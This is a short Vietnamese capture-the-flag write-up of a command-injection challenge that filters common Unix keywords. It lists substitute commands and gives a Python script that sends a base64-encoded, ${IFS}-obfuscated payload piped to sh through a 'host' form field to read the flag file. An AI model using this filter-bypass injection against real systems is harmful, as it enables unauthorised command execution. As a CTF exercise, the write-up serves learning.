Vào thẳng vấn đề luôn, bài này thuộc dạng command injection .Nó lọc 1 số từ khóa của các câu lệnh unix phổ biến những vẫn chừa cho ta một vài câu lênh phổ biến để ta biết chắc rằng bị command injection.  

dựa vào lời giải trên mạng tôi đã phát hiện ra một rối câu lệnh có thể thay thế cho các câu lệnh bị chặn ví dụ

-ls -> du
-cat -> tac

để giải bài này thì ta sẽ chuyển các câu lệnh của ta sang base64 rồi giải mã đó để nó thực hiện


```
import requests
import base64

# Câu lệnh Unix mà bạn muốn thực thi
unix_command = "cat /flag.txt | base64"

# Mã hóa câu lệnh thành chuỗi base64
encoded_command = base64.b64encode(unix_command.encode('utf-8')).decode('utf-8')

# Tạo payload để thực hiện command injection
payload = "echo${IFS}" + encoded_command + "|base64${IFS}-d|sh"

# Gửi yêu cầu POST với payload command injection
r = requests.post("https://4bbd896ee6650a40c580bd79.deadsec.quest/flag", data={'host': payload})

# In kết quả
print(r.text)
```
